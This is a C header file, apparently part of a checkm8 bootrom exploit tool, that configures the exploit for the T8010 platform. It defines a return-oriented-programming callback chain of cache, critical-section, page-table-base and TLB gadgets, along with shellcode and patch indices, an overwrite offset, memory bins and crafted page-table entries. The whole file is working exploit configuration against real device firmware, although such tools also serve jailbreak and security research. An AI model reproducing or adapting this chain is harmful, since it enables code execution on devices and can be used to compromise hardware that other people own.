#ifndef CHECKM8_TOOL_EXPLOIT_CONFIG_H
#define CHECKM8_TOOL_EXPLOIT_CONFIG_H

#include "checkm8_config.h"
#include "dev/addr.h"

struct callback
{
    uint64_t arg;
    uint64_t func;
};

struct rop_block
{
    struct
    {
        uint64_t callback;
        uint64_t next;
    } request[5];

    struct callback params[5];
};


struct bin
{
    int start, end;
};

#define EXPLOIT_REPLACE     -1

#if CHECKM8_PLATFORM == 8010

#define EXPLOIT_OVERWRITE   0x580

#define INDEX_CIVAC         0
#define INDEX_PATCH         5
#define INDEX_SHELLCODE     9

const struct callback exploit_rop[] = {
        {.func = ADDR_DC_CIVAC, .arg = EXPLOIT_REPLACE},
        {.func = ADDR_DMB, .arg = 0},
        {.func = ADDR_ENTER_CRITICAL, .arg = 0},
        {.func = ADDR_WRITE_TTBR0, .arg = ADDR_DFU_IMG_BASE},
        {.func = ADDR_TLBI, .arg = 0},
        {.func = EXPLOIT_REPLACE, .arg = 0},
        {.func = ADDR_WRITE_TTBR0, .arg = 0x1800A0000},
        {.func = ADDR_TLBI, .arg = 0},
        {.func = ADDR_EXIT_CRITICAL, .arg = 0},
        {.func = EXPLOIT_REPLACE, .arg = EXPLOIT_REPLACE}
};

const struct bin exploit_bins[] = {
        {.start = 0, .end = 0x400},     // up to ROM translation
        {.start = 0x408, .end = 0x600}, // up to SRAM translation
        {.start = 0x610, .end = -1}     // after SRAM translation
};

const uint64_t exploit_table[] = {
        [0x80] = 0x1000006a5,
        [0xc0] = 0x60000180000625,
        [0xc1] = 0x1800006a5
};

#else
#error "unsupported checkm8 platform"
#endif

#define EXPLOIT_NUM_ROP     sizeof(exploit_rop) / sizeof(struct callback)
#define EXPLOIT_NUM_BINS    sizeof(exploit_bins) / sizeof(struct bin)

#endif //CHECKM8_TOOL_EXPLOIT_CONFIG_H
